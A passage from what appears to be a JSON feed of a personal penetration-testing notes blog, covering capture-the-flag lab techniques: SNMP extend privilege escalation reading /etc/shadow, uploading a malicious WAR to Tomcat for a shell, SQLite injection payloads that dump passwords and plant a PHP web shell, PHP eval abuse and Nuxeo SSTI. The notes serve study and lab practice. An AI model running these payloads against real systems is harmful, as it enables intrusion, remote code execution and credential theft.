class=\"p\">.</span><span class=\"n\">text</span><span class=\"p\">)[</span><span class=\"mi\">0</span><span class=\"p\">]</span>  <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">sql_response</span><span class=\"p\">)</span><span class=\"n\">generate_wav</span><span class=\"p\">(</span><span class=\"n\">query</span><span class=\"p\">)</span><span class=\"n\">send_file</span><span class=\"p\">()</span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/a.i.-exploiting/bra.i.nsmasher-presentation#presentation\">BRA.I.NSMASHER Presentation - HackTricks</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/06/08/ai",
            
            
            
            
            
            "date_published": "2022-06-08T00:00:00+08:00",
            "date_modified": "2022-06-08T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/06/02/snmp-extended-script",
            "title": "SNMP Extended Script",
            "summary": "SNMP Extended Script",
            "content_text": "OverviewAttacker can do privesc if it can gain access to SNMP extensions.Environment Setup  SNMP extension enabled using custom script and low privileged user has write access to custom scripts directory.[root@pit ~]# cat /etc/snmp/snmpd.conf | grep extendextend monitoring /usr/bin/monitor[root@pit ~]# [root@pit ~]# cat /usr/bin/monitor #!/bin/bashfor script in /usr/local/monitoring/check*shdo    /bin/bash $scriptdone[root@pit ~]# [root@pit ~]# getfacl /usr/local/monitoring/getfacl: Removing leading '/' from absolute path names# file: usr/local/monitoring/# owner: root# group: rootuser::rwxuser:michelle:-wxgroup::rwxmask::rwxother::---[root@pit ~]# Steps  Create malicious scriptecho -n '#!/bin/bash\\ncat /etc/shadow &gt; /tmp/shadow.txt' &gt; /usr/local/monitoring/check_evil.sh  Trigger SNMP extension# 10.10.10.241 - victim IPsnmpbulkwalk -On -r1 -v2c -c public 10.10.10.241 1Reference  HTB Pit",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can do privesc if it can gain access to SNMP extensions.</p><h2 id=\"environment-setup\">Environment Setup</h2><ul>  <li>SNMP extension enabled using custom script and low privileged user has write access to custom scripts directory.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">[</span>root@pit ~]# <span class=\"nb\">cat</span> /etc/snmp/snmpd.conf | <span class=\"nb\">grep </span>extendextend monitoring /usr/bin/monitor<span class=\"o\">[</span>root@pit ~]# <span class=\"o\">[</span>root@pit ~]# <span class=\"nb\">cat</span> /usr/bin/monitor <span class=\"c\">#!/bin/bash</span><span class=\"k\">for </span>script <span class=\"k\">in</span> /usr/local/monitoring/check<span class=\"k\">*</span>sh<span class=\"k\">do</span>    /bin/bash <span class=\"nv\">$script</span><span class=\"k\">done</span><span class=\"o\">[</span>root@pit ~]# <span class=\"o\">[</span>root@pit ~]# getfacl /usr/local/monitoring/getfacl: Removing leading <span class=\"s1\">'/'</span> from absolute path names<span class=\"c\"># file: usr/local/monitoring/</span><span class=\"c\"># owner: root</span><span class=\"c\"># group: root</span>user::rwxuser:michelle:-wxgroup::rwxmask::rwxother::---<span class=\"o\">[</span>root@pit ~]# </code></pre></div></div><h2 id=\"steps\">Steps</h2><ul>  <li>Create malicious script</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">echo</span> <span class=\"nt\">-n</span> <span class=\"s1\">'#!/bin/bash\\ncat /etc/shadow &gt; /tmp/shadow.txt'</span> <span class=\"o\">&gt;</span> /usr/local/monitoring/check_evil.sh</code></pre></div></div><ul>  <li>Trigger SNMP extension</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># 10.10.10.241 - victim IP</span>snmpbulkwalk <span class=\"nt\">-On</span> <span class=\"nt\">-r1</span> <span class=\"nt\">-v2c</span> <span class=\"nt\">-c</span> public 10.10.10.241 1</code></pre></div></div><h2 id=\"reference\">Reference</h2><ul>  <li>HTB Pit</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/06/02/snmp-extended-script",
            
            
            
            "tags": ["snmp","privesc"],
            
            "date_published": "2022-06-02T00:00:00+08:00",
            "date_modified": "2022-06-02T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/28/uploading-malicuous-jar-or-war-file",
            "title": "Uploading malicuous JAR or WAR file",
            "summary": "Uploading malicuous JAR or WAR file",
            "content_text": "OverviewAttacker can deploy malicuous JAR or WAR file to gain RCE.Versions Tested  Tomcat 9.0.31  Tomcat 7.0.88 (Microsoft Windows Server 2012 R2 Standard)Steps - CLI  Generate war file. See tomcat part on [[Reverse Shell and Web Shells]]  Uploadcurl -u 'webdev:password123' --upload-file evil.war 'http://10.10.163.51:8080/manager/text/deploy?path=/evil.war'  Verifycurl -u 'webdev:password123' 'http://10.10.163.51:8080/manager/text/list'  Open netcat listener on attacker machine  Executecurl -u 'webdev:password123' http://10.10.163.51:8080/evil.warSteps - GUI  Ensure you have access to host manager app  Create JAR file. See [[Reverse Shell and Web Shells]]  Upload it via manager app and deploy  Open netcat listener  Access the servlet and enjoycurl -u 'bob:bubbles' http://thm:1234/evilAlernatives  You can also upload jsp file instead of war file  Tomcat deployer  HTB jerry - uploading cmd.jsp",
            "content_html": "<h1 id=\"overview\">Overview</h1><p>Attacker can deploy malicuous JAR or WAR file to gain RCE.</p><h1 id=\"versions-tested\">Versions Tested</h1><ul>  <li>Tomcat 9.0.31</li>  <li>Tomcat 7.0.88 (Microsoft Windows Server 2012 R2 Standard)</li></ul><h1 id=\"steps---cli\">Steps - CLI</h1><ul>  <li>Generate war file. See tomcat part on [[Reverse Shell and Web Shells]]</li>  <li>Upload</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl <span class=\"nt\">-u</span> <span class=\"s1\">'webdev:password123'</span> <span class=\"nt\">--upload-file</span> evil.war <span class=\"s1\">'http://10.10.163.51:8080/manager/text/deploy?path=/evil.war'</span></code></pre></div></div><ul>  <li>Verify</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl <span class=\"nt\">-u</span> <span class=\"s1\">'webdev:password123'</span> <span class=\"s1\">'http://10.10.163.51:8080/manager/text/list'</span></code></pre></div></div><ul>  <li>Open netcat listener on attacker machine</li>  <li>Execute</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl <span class=\"nt\">-u</span> <span class=\"s1\">'webdev:password123'</span> http://10.10.163.51:8080/evil.war</code></pre></div></div><h1 id=\"steps---gui\">Steps - GUI</h1><ul>  <li>Ensure you have access to host manager app</li>  <li>Create JAR file. See [[Reverse Shell and Web Shells]]</li>  <li>Upload it via manager app and deploy</li></ul><p><img src=\"/spindel/assets/Uploading%20malicuous%20JAR%20or%20WAR%20file/B3786FC8-1BE8-49F3-8D7C-D7D5577D73D9.png\" alt=\"\" /></p><ul>  <li>Open netcat listener</li>  <li>Access the servlet and enjoy</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl -u 'bob:bubbles' http://thm:1234/evil</code></pre></div></div><h1 id=\"alernatives\">Alernatives</h1><ul>  <li>You can also upload <a href=\"https://www.youtube.com/watch?v=yTHtLi9YZ2s&amp;t=1050s\">jsp</a> file instead of war file</li></ul><p><img src=\"/spindel/assets/Uploading%20malicuous%20JAR%20or%20WAR%20file/3D882918-7ECC-4D4C-8D20-0FEDF14E4C45.png\" alt=\"\" /></p><ul>  <li><a href=\"https://github.com/mgeeky/tomcatWarDeployer\">Tomcat deployer</a></li>  <li><a href=\"https://www.youtube.com/watch?v=PJeBIey8gc4&amp;t=1362s\">HTB jerry</a> - uploading cmd.jsp</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/28/uploading-malicuous-jar-or-war-file",
            
            
            
            "tags": ["devops","tomcat","java","rce","foothold"],
            
            "date_published": "2022-05-28T00:00:00+08:00",
            "date_modified": "2022-05-28T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/24/decyrpting-admin-password-using-dnspy-debug",
            "title": "Decyrpting Admin password using DNSpy debug",
            "summary": "Decyrpting Admin password using DNSpy debug",
            "content_text": "OverviewAttacker can get admin password via decompiled .NET app from a misconfigured SMB share.Environment Setup  HqkLdap.exe - .NET app downloaded from SMB share  Windows box to decompile the app  Low privileged creds to navigate on running app over the networkSteps  Explore app and gather LDAP settings&gt;setdir c:\\program files\\hqk\\ldapCurrent directory set to ldap&gt;listUse the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command QUERY FILES IN CURRENT DIRECTORY[1]   HqkLdap.exe[2]   Ldap.confCurrent Directory: ldap&gt;runquery 2Invalid database configuration found. Please contact your system administrator&gt;showquery 2Domain=nest.localPort=389BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=localUser=AdministratorPassword=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=  Transfer HqkLdap.exe to windows box  Create txt file and paste the LDAP config gathered above  Download dnSpy and decompile app  Run debugger and step through each process until you see the decryption part for the admin password  You can now use the credentials with psexecReferences  HTB Nest",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can get admin password via decompiled .NET app from a misconfigured SMB share.</p><h2 id=\"environment-setup\">Environment Setup</h2><ul>  <li><code class=\"language-plaintext highlighter-rouge\">HqkLdap.exe</code> - .NET app downloaded from SMB share</li>  <li>Windows box to decompile the app</li>  <li>Low privileged creds to navigate on running app over the network</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Explore app and gather LDAP settings</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">&gt;</span>setdir c:<span class=\"se\">\\p</span>rogram files<span class=\"se\">\\h</span>qk<span class=\"se\">\\l</span>dapCurrent directory <span class=\"nb\">set </span>to ldap<span class=\"o\">&gt;</span>listUse the query ID numbers below with the RUNQUERY <span class=\"nb\">command </span>and the directory names with the SETDIR <span class=\"nb\">command </span>QUERY FILES IN CURRENT DIRECTORY<span class=\"o\">[</span>1]   HqkLdap.exe<span class=\"o\">[</span>2]   Ldap.confCurrent Directory: ldap<span class=\"o\">&gt;</span>runquery 2Invalid database configuration found. Please contact your system administrator<span class=\"o\">&gt;</span>showquery 2<span class=\"nv\">Domain</span><span class=\"o\">=</span>nest.local<span class=\"nv\">Port</span><span class=\"o\">=</span>389<span class=\"nv\">BaseOu</span><span class=\"o\">=</span><span class=\"nv\">OU</span><span class=\"o\">=</span>WBQ Users,OU<span class=\"o\">=</span>Production,DC<span class=\"o\">=</span>nest,DC<span class=\"o\">=</span><span class=\"nb\">local</span><span class=\"nv\">User</span><span class=\"o\">=</span>Administrator<span class=\"nv\">Password</span><span class=\"o\">=</span>yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4<span class=\"o\">=</span></code></pre></div></div><ul>  <li>Transfer <code class=\"language-plaintext highlighter-rouge\">HqkLdap.exe</code> to windows box</li>  <li>Create txt file and paste the LDAP config gathered above</li>  <li>Download <a href=\"https://github.com/dnSpy/dnSpy\">dnSpy</a> and decompile app</li></ul><p><img src=\"/spindel/assets/Decyrpting%20Admin%20password%20using%20DNSpy%20debug/91469A27-CCC3-4850-ADAB-B91EE820BB2E.png\" alt=\"\" /></p><ul>  <li>Run debugger and step through each process until you see the decryption part for the admin password</li></ul><p><img src=\"/spindel/assets/Decyrpting%20Admin%20password%20using%20DNSpy%20debug/A08CFDDB-A099-4111-8FD3-E53F3C515355.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Decyrpting%20Admin%20password%20using%20DNSpy%20debug/A962D76D-5848-4A06-BE28-CBCC3A042C18.png\" alt=\"\" /></p><ul>  <li>You can now use the credentials with <code class=\"language-plaintext highlighter-rouge\">psexec</code></li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.youtube.com/watch?v=tDbVw6uGx8g\">HTB Nest</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/24/decyrpting-admin-password-using-dnspy-debug",
            
            
            
            "tags": ["windows","re","privesc","foothold","dotnet"],
            
            "date_published": "2022-05-24T00:00:00+08:00",
            "date_modified": "2022-05-24T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/22/sql-injection-sqlite",
            "title": "SQL Injection - SQLite",
            "summary": "SQL Injection - SQLite",
            "content_text": "Databasessqlite_masterQuick Detection-- check versionuser=foo' and 1=2 union select all 1,2,3,sqlite_version();--&amp;password=abcReading a filesqlite&gt;sqlite&gt; CREATE TABLE pwn.data (data TEXT);sqlite&gt; .tablesdata      pwn.datasqlite&gt; .import /etc/passwd datasqlite&gt; select * from data;root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/usr/bin/nologin............sqlite&gt; .tablesdata       pwn.data   pwn.shell  shell    sqlite&gt; DROP TABLE pwn.shell;Payloads-- getting table namesuser=foo' UNION SELECT group_concat(tbl_name),1,2,3 FROM sqlite_master;--&amp;password=abcuser=foo' UNION SELECT group_concat(tbl_name),1,2,3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';--&amp;password=ab-- extracting column namesuser=foo' UNION SELECT sql,2,3,4 from sqlite_master where name='users';--&amp;password=abc-- getting a username and a passworduser=foo' UNION SELECT name,2,3,password from users--&amp;password=abcuser=foo' UNION SELECT name,2,3,password from users limit 2 offset 10--&amp;password=abc-- get info for lucas washingtonuser=foo' UNION SELECT name,2,3,password from users where name like '%lucas_%'--&amp;password=abc-- planting a php file?id=bob’; ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘&lt;? system($_GET[‘cmd’]); ?&gt;’;--Reference  PayloadsAllTheThings/SQLite Injection.md at master · swisskyrepo/PayloadsAllTheThings · GitHub  Injecting SQLite database based application",
            "content_html": "<h2 id=\"databases\">Databases</h2><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>sqlite_master</code></pre></div></div><h2 id=\"quick-detection\">Quick Detection</h2><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">-- check version</span><span class=\"k\">user</span><span class=\"o\">=</span><span class=\"n\">foo</span><span class=\"s1\">' and 1=2 union select all 1,2,3,sqlite_version();--&amp;password=abc</span></code></pre></div></div><h2 id=\"reading-a-file\">Reading a file</h2><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">sqlite</span><span class=\"o\">&gt;</span><span class=\"n\">sqlite</span><span class=\"o\">&gt;</span> <span class=\"k\">CREATE</span> <span class=\"k\">TABLE</span> <span class=\"n\">pwn</span><span class=\"p\">.</span><span class=\"k\">data</span> <span class=\"p\">(</span><span class=\"k\">data</span> <span class=\"nb\">TEXT</span><span class=\"p\">);</span><span class=\"n\">sqlite</span><span class=\"o\">&gt;</span> <span class=\"p\">.</span><span class=\"n\">tables</span><span class=\"k\">data</span>      <span class=\"n\">pwn</span><span class=\"p\">.</span><span class=\"k\">data</span><span class=\"n\">sqlite</span><span class=\"o\">&gt;</span> <span class=\"p\">.</span><span class=\"n\">import</span> <span class=\"o\">/</span><span class=\"n\">etc</span><span class=\"o\">/</span><span class=\"n\">passwd</span> <span class=\"k\">data</span><span class=\"n\">sqlite</span><span class=\"o\">&gt;</span> <span class=\"k\">select</span> <span class=\"o\">*</span> <span class=\"k\">from</span> <span class=\"k\">data</span><span class=\"p\">;</span><span class=\"n\">root</span><span class=\"p\">:</span><span class=\"n\">x</span><span class=\"p\">:</span><span class=\"mi\">0</span><span class=\"p\">:</span><span class=\"mi\">0</span><span class=\"p\">:</span><span class=\"n\">root</span><span class=\"p\">:</span><span class=\"o\">/</span><span class=\"n\">root</span><span class=\"p\">:</span><span class=\"o\">/</span><span class=\"n\">bin</span><span class=\"o\">/</span><span class=\"n\">bash</span><span class=\"n\">bin</span><span class=\"p\">:</span><span class=\"n\">x</span><span class=\"p\">:</span><span class=\"mi\">1</span><span class=\"p\">:</span><span class=\"mi\">1</span><span class=\"p\">:</span><span class=\"n\">bin</span><span class=\"p\">:</span><span class=\"o\">/</span><span class=\"n\">bin</span><span class=\"p\">:</span><span class=\"o\">/</span><span class=\"n\">usr</span><span class=\"o\">/</span><span class=\"n\">bin</span><span class=\"o\">/</span><span class=\"n\">nologin</span><span class=\"p\">......</span><span class=\"p\">......</span><span class=\"n\">sqlite</span><span class=\"o\">&gt;</span> <span class=\"p\">.</span><span class=\"n\">tables</span><span class=\"k\">data</span>       <span class=\"n\">pwn</span><span class=\"p\">.</span><span class=\"k\">data</span>   <span class=\"n\">pwn</span><span class=\"p\">.</span><span class=\"n\">shell</span>  <span class=\"n\">shell</span>    <span class=\"n\">sqlite</span><span class=\"o\">&gt;</span> <span class=\"k\">DROP</span> <span class=\"k\">TABLE</span> <span class=\"n\">pwn</span><span class=\"p\">.</span><span class=\"n\">shell</span><span class=\"p\">;</span></code></pre></div></div><h1 id=\"payloads\">Payloads</h1><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">-- getting table names</span><span class=\"k\">user</span><span class=\"o\">=</span><span class=\"n\">foo</span><span class=\"s1\">' UNION SELECT group_concat(tbl_name),1,2,3 FROM sqlite_master;--&amp;password=abcuser=foo'</span> <span class=\"k\">UNION</span> <span class=\"k\">SELECT</span> <span class=\"n\">group_concat</span><span class=\"p\">(</span><span class=\"n\">tbl_name</span><span class=\"p\">),</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span> <span class=\"k\">FROM</span> <span class=\"n\">sqlite_master</span> <span class=\"k\">WHERE</span> <span class=\"k\">type</span><span class=\"o\">=</span><span class=\"s1\">'table'</span> <span class=\"k\">and</span> <span class=\"n\">tbl_name</span> <span class=\"k\">NOT</span> <span class=\"k\">like</span> <span class=\"s1\">'sqlite_%'</span><span class=\"p\">;</span><span class=\"c1\">--&amp;password=ab</span><span class=\"c1\">-- extracting column names</span><span class=\"k\">user</span><span class=\"o\">=</span><span class=\"n\">foo</span><span class=\"s1\">' UNION SELECT sql,2,3,4 from sqlite_master where name='</span><span class=\"n\">users</span><span class=\"s1\">';--&amp;password=abc-- getting a username and a passworduser=foo'</span> <span class=\"k\">UNION</span> <span class=\"k\">SELECT</span> <span class=\"n\">name</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">,</span><span class=\"n\">password</span> <span class=\"k\">from</span> <span class=\"n\">users</span><span class=\"c1\">--&amp;password=abc</span><span class=\"k\">user</span><span class=\"o\">=</span><span class=\"n\">foo</span><span class=\"s1\">' UNION SELECT name,2,3,password from users limit 2 offset 10--&amp;password=abc-- get info for lucas washingtonuser=foo'</span> <span class=\"k\">UNION</span> <span class=\"k\">SELECT</span> <span class=\"n\">name</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">,</span><span class=\"n\">password</span> <span class=\"k\">from</span> <span class=\"n\">users</span> <span class=\"k\">where</span> <span class=\"n\">name</span> <span class=\"k\">like</span> <span class=\"s1\">'%lucas_%'</span><span class=\"c1\">--&amp;password=abc</span><span class=\"c1\">-- planting a php file</span><span class=\"o\">?</span><span class=\"n\">id</span><span class=\"o\">=</span><span class=\"n\">bob</span><span class=\"err\">’</span><span class=\"p\">;</span> <span class=\"n\">ATTACH</span> <span class=\"k\">DATABASE</span> <span class=\"err\">‘</span><span class=\"o\">/</span><span class=\"n\">var</span><span class=\"o\">/</span><span class=\"n\">www</span><span class=\"o\">/</span><span class=\"n\">lol</span><span class=\"p\">.</span><span class=\"n\">php</span><span class=\"err\">’</span> <span class=\"k\">AS</span> <span class=\"n\">lol</span><span class=\"p\">;</span> <span class=\"k\">CREATE</span> <span class=\"k\">TABLE</span> <span class=\"n\">lol</span><span class=\"p\">.</span><span class=\"n\">pwn</span> <span class=\"p\">(</span><span class=\"n\">dataz</span> <span class=\"nb\">text</span><span class=\"p\">);</span> <span class=\"k\">INSERT</span> <span class=\"k\">INTO</span> <span class=\"n\">lol</span><span class=\"p\">.</span><span class=\"n\">pwn</span> <span class=\"p\">(</span><span class=\"n\">dataz</span><span class=\"p\">)</span> <span class=\"k\">VALUES</span> <span class=\"p\">(</span><span class=\"err\">‘</span><span class=\"o\">&lt;?</span> <span class=\"k\">system</span><span class=\"p\">(</span><span class=\"err\">$</span><span class=\"n\">_GET</span><span class=\"p\">[</span><span class=\"err\">‘</span><span class=\"n\">cmd</span><span class=\"err\">’</span><span class=\"p\">]);</span> <span class=\"o\">?&gt;</span><span class=\"err\">’</span><span class=\"p\">;</span><span class=\"c1\">--</span></code></pre></div></div><h2 id=\"reference\">Reference</h2><ul>  <li><a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md\">PayloadsAllTheThings/SQLite Injection.md at master · swisskyrepo/PayloadsAllTheThings · GitHub</a></li>  <li><a href=\"https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf\">Injecting SQLite database based application</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/22/sql-injection-sqlite",
            
            
            
            "tags": ["sqli","db","enum"],
            
            "date_published": "2022-05-22T00:00:00+08:00",
            "date_modified": "2022-05-22T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/22/dangerous-functions",
            "title": "Dangerous Functions",
            "summary": "Dangerous Functions",
            "content_text": "PHP EvalSample usage:eval('$x = (5-1);');echo($x); // outputs 4Malicuous usage:eval('echo exec(\\'whoami\\');')eval('echo exec(\\'ls -l /home/alice\\');')  How eval() in php can be dangerous in web application’s security? - Information Security Stack ExchangeOther PHP Functionsexecshell_execsystempassthrupopenUseful Configurations# pin you to a specific directoryopen_basedirCommands# checks what dangerous functions exposedpython2 ~/data/tools/dfunc-bypasser.py --url http://htb/utility-scripts/info.phpReferences  Dangerous php functions Bypassing disable_functions in PHP - Pentester Notes  Dangerous PHP Functions · GitHub",
            "content_html": "<h2 id=\"php-eval\">PHP Eval</h2><p>Sample usage:</p><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"s1\">'$x = (5-1);'</span><span class=\"p\">);</span><span class=\"k\">echo</span><span class=\"p\">(</span><span class=\"nv\">$x</span><span class=\"p\">);</span> <span class=\"c1\">// outputs 4</span></code></pre></div></div><p>Malicuous usage:</p><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"s1\">'echo exec(\\'whoami\\');'</span><span class=\"p\">)</span><span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"s1\">'echo exec(\\'ls -l /home/alice\\');'</span><span class=\"p\">)</span></code></pre></div></div><ul>  <li><a href=\"https://security.stackexchange.com/questions/179375/how-eval-in-php-can-be-dangerous-in-web-applications-security\">How eval() in php can be dangerous in web application’s security? - Information Security Stack Exchange</a></li></ul><h2 id=\"other-php-functions\">Other PHP Functions</h2><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>execshell_execsystempassthrupopen</code></pre></div></div><h2 id=\"useful-configurations\">Useful Configurations</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># pin you to a specific directory</span>open_basedir</code></pre></div></div><h2 id=\"commands\">Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># checks what dangerous functions exposed</span>python2 ~/data/tools/dfunc-bypasser.py <span class=\"nt\">--url</span> http://htb/utility-scripts/info.php</code></pre></div></div><h1 id=\"references\">References</h1><ul>  <li><a href=\"https://alionder.net/dangerous-php-functions/\">Dangerous php functions Bypassing disable_functions in PHP - Pentester Notes</a></li>  <li><a href=\"https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720\">Dangerous PHP Functions · GitHub</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/22/dangerous-functions",
            
            
            
            
            
            "date_published": "2022-05-22T00:00:00+08:00",
            "date_modified": "2022-05-22T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/20/dangerous-functions",
            "title": "Dangerous Functions",
            "summary": "Dangerous Functions",
            "content_text": "PHP EvalSample usage:eval('$x = (5-1);');echo($x); // outputs 4Malicuous usage:eval('echo exec(\\'whoami\\');')eval('echo exec(\\'ls -l /home/alice\\');')  How eval() in php can be dangerous in web application’s security? - Information Security Stack ExchangeOther PHP Functionsexecshell_execsystempassthrupopenUseful Configurations# pin you to a specific directoryopen_basedirCommands# checks what dangerous functions exposedpython2 ~/data/tools/dfunc-bypasser.py --url http://htb/utility-scripts/info.phpReferences  Dangerous php functions Bypassing disable_functions in PHP - Pentester Notes  Dangerous PHP Functions · GitHub",
            "content_html": "<h2 id=\"php-eval\">PHP Eval</h2><p>Sample usage:</p><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"s1\">'$x = (5-1);'</span><span class=\"p\">);</span><span class=\"k\">echo</span><span class=\"p\">(</span><span class=\"nv\">$x</span><span class=\"p\">);</span> <span class=\"c1\">// outputs 4</span></code></pre></div></div><p>Malicuous usage:</p><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"s1\">'echo exec(\\'whoami\\');'</span><span class=\"p\">)</span><span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"s1\">'echo exec(\\'ls -l /home/alice\\');'</span><span class=\"p\">)</span></code></pre></div></div><ul>  <li><a href=\"https://security.stackexchange.com/questions/179375/how-eval-in-php-can-be-dangerous-in-web-applications-security\">How eval() in php can be dangerous in web application’s security? - Information Security Stack Exchange</a></li></ul><h2 id=\"other-php-functions\">Other PHP Functions</h2><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>execshell_execsystempassthrupopen</code></pre></div></div><h2 id=\"useful-configurations\">Useful Configurations</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># pin you to a specific directory</span>open_basedir</code></pre></div></div><h2 id=\"commands\">Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># checks what dangerous functions exposed</span>python2 ~/data/tools/dfunc-bypasser.py <span class=\"nt\">--url</span> http://htb/utility-scripts/info.php</code></pre></div></div><h1 id=\"references\">References</h1><ul>  <li><a href=\"https://alionder.net/dangerous-php-functions/\">Dangerous php functions Bypassing disable_functions in PHP - Pentester Notes</a></li>  <li><a href=\"https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720\">Dangerous PHP Functions · GitHub</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/20/dangerous-functions",
            
            
            
            
            
            "date_published": "2022-05-20T00:00:00+08:00",
            "date_modified": "2022-05-20T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/19/nuxeo",
            "title": "Nuxeo",
            "summary": "Nuxeo",
            "content_text": "Oveview  Collaboration system  Tech stack          Tomcat      Elasticsearch      DB (PostgreSQL, Mysql)      Version Detection  You can see copyright as well as version infromation at the bottom of login page# Version is 10.2Copyright © 2001-2022 Nuxeo and respective authors. Nuxeo Platform FT 10.2Credentials# DefaultAdministrator:Administrator# Some DB Users to trynuxeoInteresting Files and Directories# Nuxeo config. You can see DB passwords here.C:\\programdata\\nuxeo\\conf\\nuxeo.conf# Some tomcat configconf/# User settings?~/.nxshellC:\\users\\svc_account\\.nxshell\\historyC:\\users\\svc_account\\.nxshell\\shell.propertiesInteresting URL paths/nuxeo/nuxeo/login.jsp/nxserver/nxstartup.facesInteresting Database TablesusersdigestauthcontentgroupsuserinfonoteInteresting Elasticearch Datacurl 'http://localhost:9200/nuxeo-audit/_search?pretty=true'curl 'http://localhost:9200/nuxeo/_search?pretty=true'Vulnerabilities, Attacks and Exploits  Orange: How I Chained 4 Bugs(Features?) into RCE on Amazon Collaboration System  Nuxeo 10 Authentication Bypass and RCE using SSTI# HTB Hancliffe payload. Take note there is a URI parsing# vulnerability that's why there is a `/maintenance/..;/`http://hancliffe/maintenance/..;/login.jsp/pwn$%7B7+7%7D.xhtml# Another payload but with powershell encoded 